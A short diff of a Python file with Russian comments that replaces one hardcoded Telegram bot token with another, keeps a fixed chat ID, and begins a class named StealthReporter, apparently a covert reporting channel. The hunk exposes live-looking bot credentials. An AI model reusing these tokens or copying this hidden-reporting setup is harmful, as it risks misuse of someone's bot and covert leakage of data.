@@ -10,7 +10,7 @@ from telegram import Bot
 from telegram.error import TelegramError
 
 # Конфигурация Telegram
-TG_BOT_TOKEN = "7763698951:AAHz1-uXl4VYDHRstjtu4uecaZHhRhhG3Gg"
+TG_BOT_TOKEN = "7666386936:AAE20PWB5iIIsEayDBGyHKByOzuRjYbEUZE"
 TG_CHAT_ID = "35381551"
 
 class StealthReporter:
